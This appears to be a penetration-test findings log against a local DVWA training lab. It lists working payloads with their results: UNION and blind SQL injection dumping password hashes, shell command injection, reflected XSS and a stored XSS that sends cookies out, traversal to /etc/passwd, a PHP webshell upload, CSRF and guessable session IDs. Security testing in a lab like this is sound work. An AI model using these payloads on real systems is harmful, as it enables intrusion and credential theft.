findings.title: SQL Injection (reflected, UNION-based) — full users credential table extraction via id parameter
steps: Authenticate to http://127.0.0.1/login.php as admin/password (capture PHPSESSID, ensure security=low cookie).
GET http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit to confirm baseline row (admin/admin) renders.
Send the URL-encoded payload: id=0' UNION SELECT user,password FROM users-- - with Submit=Submit.

Read the response: the <pre> block enumerates five users — admin, gordonb, 1337, pablo, smithy — with their MD5 password hashes (admin=5f4dcc3b5aa765d61d8327deb882cf99, gordonb=e99a18c428cb38d5f260853678922e03, 1337=8d3533d75ae2c3966d7e0d4fcc69216b, pablo=0d107d09f5bbe40cade3de5c71e9e9b7, smithy=5f4dcc3b5aa765d61d8327deb882cf99).
findings.expected: The application would reject or parameterize the untrusted id value, returning either a single row for id=0 or a database-layer error — no enumeration of the users table.
findings.observed: Five user rows are returned including MD5 password hashes; the query is clearly string-interpolated into the SQL with no sanitization (the injection prefix '0'' is echoed verbatim back in the response, proving reflection).

findings.title: Blind SQL Injection — boolean and time-based extraction of arbitrary data via id parameter
findings.target: http://127.0.0.1/vulnerabilities/sqli_blind/?id=1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1))=53-- -&Submit=Submit
steps: Authenticated session with PHPSESSID cookie.
GET id=1 -> page shows 'User ID exists in the database.'; GET id=99999 -> the message is absent (boolean oracle).
GET id=1' AND '1'='1 -> exists; GET id=1' AND '1'='2 -> absent (string-concat injection confirmed).
GET id=1' AND SLEEP(3)-- - measured ~3145ms vs ~126ms baseline (time-based confirmed).
GET id=1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1))=53-- - -> 'exists' (truthy, so the first MD5 char of admin's password is '5', matching the known hash).
findings.expected: The id value would be parameterized; payload syntax would not be evaluated; no timing oracles would be available.
findings.observed: Boolean oracle ('exists' / absent) and ~3-second time-based oracle both work, enabling per-character extraction of any value reachable via SQL.

findings.title: OS Command Injection — arbitrary command execution as www-data via ip parameter (POST)
steps: Authenticated session with PHPSESSID cookie.
POST to /vulnerabilities/exec/ with form fields: ip=127.0.0.1; id, Submit=Submit, user_token=<hidden CSRF token from prior GET>.
Read response <pre> block: ping of 127.0.0.1 followed by 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'.
findings.expected: The ip value would be validated as an IP-shaped string and rejected if non-conforming; shell metacharacters would be stripped or escaped.
findings.observed: The submitted ip value is concatenated into a shell ping(1) invocation with no escaping; the ';' separator launches a second shell command (id) that returns the web-server UID.

findings.title: Reflected Cross-Site Scripting — unencoded <script> reflection via name parameter
steps: Authenticated session.
GET /vulnerabilities/xss_r/?name=<script>alert(1)</script>.

Read response body: '
Hello
' — the payload is rendered as live HTML.
findings.expected: The name value would be HTML-encoded (<script>...) or otherwise filtered, preventing script execution in the victim's browser.
findings.observed: The raw <script> tag is rendered into the response and would execute JavaScript in any browser that loads this URL.

findings.title: Stored Cross-Site Scripting — persistent script injection in guestbook executes on every page load
steps: Authenticated session.
POST /vulnerabilities/xss_s/ with txtName=testxss, mtxMessage=<script>document.location="http://127.0.0.1/?cookie="+document.cookie</script>, btnSign=Sign Guestbook, user_token=<hidden CSRF token>.

GET /vulnerabilities/xss_s/ — read response: '
Name: testxss
Message:
'.
findings.expected: The mtxMessage value would be HTML-encoded before persistence and/or before render; stored scripts would never be served.
findings.observed: The raw <script> tag is stored in the database and re-rendered on every subsequent page load, with no HTML encoding — every visitor who views the guestbook executes the injected script.

findings.title: Local File Inclusion — arbitrary file read via ../ traversal in page parameter
steps: Authenticated session.
GET /vulnerabilities/fi/?page=../../../../../etc/passwd (depth 5 relative to the DVWA vulnerabilities/fi include point).
Read response body — 'root:x:0:0:root:/root:/bin/bash' appears as rendered text.
findings.expected: The page value would be restricted to an allow-list of safe filenames; '../' would have been normalized or rejected.
findings.observed: Any local file readable by www-data is includable. Note: PHP allow_url_include is disabled (per /setup.php), so remote URL inclusion (RFI) is blocked in this environment.

findings.title: Unrestricted File Upload — PHP webshell upload + execution under /hackable/uploads/
steps: Authenticated session. Fetch a fresh user_token from GET /vulnerabilities/upload/.
POST /vulnerabilities/upload/ as multipart/form-data: MAX_FILE_SIZE=100000, uploaded=@shell.php (contents '<?php system($_GET["c"]); ?>'), Upload=Upload, user_token=<token>.

Read response — '
../../hackable/uploads/shell.php succesfully uploaded!
'.
GET http://127.0.0.1/hackable/uploads/shell.php?c=id;uname%20-a;pwd — response: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux 43b8266979e5 ...\n/var/www/html/hackable/uploads'.
findings.expected: Upload would be restricted to non-executable MIME types and/or safe extensions (.txt/.jpg/.png); uploaded files would not be served from a web-executable location.
findings.observed: Any file extension is accepted; the file lands in a web-executable directory and runs as PHP on the server. Full RCE achieved.

findings.title: Cross-Site Request Forgery — admin password change via single GET, no token
steps: Authenticated session.
GET /vulnerabilities/csrf/?password_new=csrfpwn&password_conf=csrfpwn&Change=Change.

Read response — '
Password Changed.
'.
(Test reverted password back to 'password' via the same GET pattern with password_new=password&password_conf=password.)
findings.expected: Password change would require POST + a CSRF token tied to the session; the form would reject GET requests.
findings.observed: A single GET request from any cross-origin image tag, link, or iframe (sent while the admin holds an active session) is sufficient to silently overwrite the admin password.

findings.title: Weak Session IDs — predictable integer-counter dvwaSession cookie enables trivial hijack
steps: Authenticated session.
POST to /vulnerabilities/weak_id/ five times; each response Set-Cookie: dvwaSession=<n> with n = 1, 2, 3, 4, 5 in sequence.
Capture: dvwaSession=1, dvwaSession=2, dvwaSession=3, dvwaSession=4, dvwaSession=5.
findings.expected: Session ID would be a high-entropy random value (PHP session_token or equivalent) — unpredictable and not enumerable.
findings.observed: The session cookie is a monotonically-incrementing integer. An attacker who knows or guesses the current counter can impersonate any user whose dvwaSession cookie value is known.
